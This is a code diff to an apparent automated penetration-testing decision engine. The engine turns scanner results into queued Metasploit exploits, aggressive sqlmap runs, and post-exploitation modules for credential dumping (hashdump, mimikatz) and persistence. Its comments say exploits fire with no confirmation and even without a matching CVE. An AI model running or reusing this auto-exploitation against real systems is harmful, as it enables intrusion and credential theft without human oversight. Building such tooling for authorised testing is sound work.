@@ -4,6 +4,13 @@ from typing import Any, Dict, List
 
 from .database import load_state, save_state
 
+from tools.cve_exploit_map import lookup_cve, lookup_port
+from tools.payload_strategy import (
+    infer_os,
+    post_modules_for_session,
+    resolve_exploit_options,
+)
+
 logger = logging.getLogger(__name__)
 
 
@@ -43,7 +50,7 @@ class DecisionEngine:
                 self._process_metasploit_results(item)
             elif tool == "sqlmap":
                 self._process_sqlmap_results(item)
-            elif tool == "nmap":
+            elif tool in ("nmap", "masscan", "rustscan"):
                 self._process_nmap_results(item)
             elif tool == "gobuster":
                 self._process_gobuster_results(item)
@@ -58,17 +65,22 @@ class DecisionEngine:
         findings = result.get("findings", [])
         vulns = []
         for finding in findings:
-            title = finding.get("title", "")
-            if "CVE" in title:
-                cve_match = re.search(r"CVE-\d{4}-\d+", title)
-                if cve_match:
-                    vulns.append(
-                        {
-                            "cve": cve_match.group(0),
-                            "severity": finding.get("severity", "unknown"),
-                            "title": title,
-                        }
-                    )
+            title = finding.get("title", "") or ""
+            template_id = str(finding.get("template_id") or finding.get("id") or "")
+            blob = f"{title} {template_id}"
+            cve_match = re.search(r"CVE-\d{4}-\d+", blob, re.IGNORECASE)
+            if cve_match:
+                cve = cve_match.group(0).upper()
+                vulns.append(
+                    {
+                        "cve": cve,
+                        "severity": finding.get("severity", "unknown"),
+                        "title": title or cve,
+                    }
+                )
+            elif re.search(r"\brce\b|remote code|unauth", blob, re.IGNORECASE):
+                # Keep high-signal nuclei hits even without a CVE id.
+                self.state["vuln_found"] = True
         if vulns:
             self.state.setdefault("vulnerabilities", []).extend(vulns)
             self.state["vuln_found"] = True
@@ -78,7 +90,28 @@ class DecisionEngine:
         issues = result.get("issues", [])
         if issues:
             self.state.setdefault("nikto_issues", []).extend(issues)
-            self.state["vuln_found"] = True
+            # Header fingerprints / Cloudflare banners are not actionable vulns.
+            # Only promote phases when Nikto reports a stronger signal.
+            serious = [
+                line
+                for line in issues
+                if isinstance(line, str)
+                and re.search(
+                    r"OSVDB|CVE-\d{4}-\d+|outdated|vulnerable|injection|"
+                    r"directory indexing|default credentials|shell|backup|"
+                    r"interesting file|retrieved .+ from",
+                    line,
+                    re.IGNORECASE,
+                )
+                and not re.search(
+                    r"Uncommon header|x-powered-by|x-nextjs|alt-svc|"
+                    r"HTTP/3|Retrieved x-powered-by",
+                    line,
+                    re.IGNORECASE,
+                )
+            ]
+            if serious:
+                self.state["vuln_found"] = True
 
     def _process_metasploit_results(self, item):
         result = _payload(item)
@@ -94,24 +127,69 @@ class DecisionEngine:
         if result.get("vulnerable"):
             self.state["sql_injection"] = True
             self.state["vuln_found"] = True
+        # Capture DBMS hint from strategy or output for follow-on targeting.
+        sqli_meta = result.get("sqli") or {}
+        if sqli_meta.get("dbms"):
+            self.state["sql_dbms"] = sqli_meta["dbms"]
+        raw = (result.get("raw_output") or result.get("error") or "").lower()
+        for needle, name in (
+            ("mysql", "mysql"),
+            ("mariadb", "mysql"),
+            ("postgresql", "postgresql"),
+            ("microsoft sql server", "mssql"),
+            ("oracle", "oracle"),
+        ):
+            if needle in raw:
+                self.state["sql_dbms"] = name
+                break
 
     def _process_nmap_results(self, item):
         result = _payload(item)
         ports = result.get("ports", [])
-        if ports:
-            self.state.setdefault("open_ports", []).extend(ports)
+        if not ports:
+            return
+        self.state.setdefault("open_ports", []).extend(ports)
+        for entry in ports:
+            if not isinstance(entry, dict):
+                continue
+            port = str(entry.get("port", "")).split("/")[0]
+            state = str(entry.get("state", "")).lower()
+            service = str(entry.get("service", "")).lower()
+            # masscan/rustscan omit state — treat missing as open.
+            is_open = state in ("", "open")
+            if not is_open:
+                continue
+            self.state.setdefault("open_port_numbers", [])
+            if port and port not in self.state["open_port_numbers"]:
+                self.state["open_port_numbers"].append(port)
+            if port == "22":
+                self.state["ssh_open"] = True
+            elif port == "21":
+                self.state["ftp_open"] = True
+            elif port in ("445", "139"):
+                self.state["smb_open"] = True
+            elif port in ("80", "443", "8080", "8443"):
+                self.state["http_open"] = True
+            if "windows" in service or "microsoft" in service:
+                self.state["target_os"] = "windows"
+            elif any(token in service for token in ("linux", "ubuntu", "debian", "unix")):
+                self.state["target_os"] = "linux"
 
     def _process_gobuster_results(self, item):
         result = _payload(item)
         dirs = result.get("directories", [])
         if dirs:
             self.state.setdefault("directories", []).extend(dirs)
+            self.state["http_open"] = True
 
     def _process_ffuf_results(self, item):
         result = _payload(item)
         finds = result.get("results", [])
         if finds:
             self.state.setdefault("ffuf_finds", []).extend(finds)
+            self.state["http_open"] = True
+        if result.get("stalled"):
+            self.state["ffuf_stalled"] = True
 
     def decide_next_phase(self, playbook_phases: List[Dict]) -> List[Dict]:
         """Given the playbook phases, decide which to run based on current state."""
@@ -159,50 +237,78 @@ class DecisionEngine:
         """Generate additional tasks based on phase results."""
         actions = []
         proposed_keys: set[str] = set()
-        exploit_modules = {
-            "CVE-2021-41773": (
-                "exploit/multi/http/apache_path_traversal",
-                ["PAYLOAD=linux/x64/meterpreter/reverse_tcp", "LHOST=0.0.0.0"],
-            ),
-            "CVE-2021-42013": (
-                "exploit/multi/http/apache_path_traversal",
-                ["PAYLOAD=linux/x64/meterpreter/reverse_tcp", "LHOST=0.0.0.0"],
-            ),
-            "CVE-2017-0143": ("exploit/windows/smb/ms17_010_eternalblue", []),
-            "MS17-010": ("exploit/windows/smb/ms17_010_eternalblue", []),
-        }
-        if self.state.get("vuln_found"):
-            for vuln in self.state.get("vulnerabilities", []):
-                cve = vuln.get("cve")
-                match = exploit_modules.get(cve)
-                if not match:
+
+        if self.state.get("sql_injection"):
+            from tools.sql_injection import follow_on_sqlmap_actions
+
+            dbms = self.state.get("dbms") or self.state.get("sql_dbms")
+            for action in follow_on_sqlmap_actions(dbms=dbms, intensity="aggressive"):
+                key = f"{action['stage']}:{action['finding_id']}:{action['args'][0]}"
+                # Dedupe on finding_id
+                fkey = f"aux:{action['finding_id']}"
+                if fkey in proposed_keys or self._action_fired(
+                    "aux", action["finding_id"], "--batch"
+                ):
                     continue
-                module, options = match
-                key = f"exploit:{cve}:{module}"
-                if key in proposed_keys or self._action_fired("exploit", cve, module):
-                    continue
-                actions.append(
-                    {
-                        "tool": "metasploit",
-                        "phase": "proof_of_impact",
-                        "stage": "exploit",
-                        "finding_id": cve,
-                        "args": [module, *options],
-                    }
-                )
+                actions.append(action)
+                proposed_keys.add(fkey)
                 proposed_keys.add(key)
 
+        os_hint = self.state.get("target_os") or "unknown"
+
+        def _queue_exploit(finding_id: str, module: str, option_stubs: list[str]) -> None:
+            # Aux scanners use stage aux; exploits use stage exploit.
+            stage = "aux" if module.startswith("auxiliary/") else "exploit"
+            key = f"{stage}:{finding_id}:{module}"
+            if key in proposed_keys or self._action_fired(stage, finding_id, module):
+                return
+            if stage == "exploit":
+                resolved = resolve_exploit_options(
+                    module,
+                    target=self.target,
+                    os_hint=infer_os(module, os_hint),
+                    existing=list(option_stubs),
+                )
+                args = [module, *resolved]
+            else:
+                args = [module, *option_stubs]
+            actions.append(
+                {
+                    "tool": "metasploit",
+                    "phase": "proof_of_impact",
+                    "stage": stage,
+                    "finding_id": finding_id,
+                    "args": args,
+                }
+            )
+            proposed_keys.add(key)
+
+        # CVE-driven exploits (nuclei / mapped findings) — no confirmation.
+        if self.state.get("vuln_found") or self.state.get("vulnerabilities"):
+            for vuln in self.state.get("vulnerabilities", []):
+                cve = vuln.get("cve")
+                match = lookup_cve(cve) if cve else None
+                if not match:
+                    continue
+                module, option_stubs = match
+                _queue_exploit(cve, module, option_stubs)
+
+        # Aggressive: open-port service exploits even without a CVE hit.
+        for port in self.state.get("open_port_numbers") or []:
+            for module, option_stubs in lookup_port(port):
+                _queue_exploit(f"port-{port}", module, list(option_stubs))
+
         if self.state.get("has_session"):
-            post_modules = [
-                "post/windows/gather/hashdump",
-                "post/windows/gather/credentials/mimikatz",
-                "post/windows/manage/persistence_exe",
-            ]
             for session in self.state.get("sessions", []):
-                session_id = session.get("id") if isinstance(session, dict) else None
+                if not isinstance(session, dict):
+                    continue
+                session_id = session.get("id")
                 if session_id is None:
                     continue
-                for module in post_modules:
+                enriched = dict(session)
+                if not enriched.get("platform") and self.state.get("target_os"):
+                    enriched["platform"] = self.state["target_os"]
+                for module in post_modules_for_session(enriched):
                     key = f"post:{session_id}:{module}"
                     if key in proposed_keys or self._action_fired(
                         "post", str(session_id), module
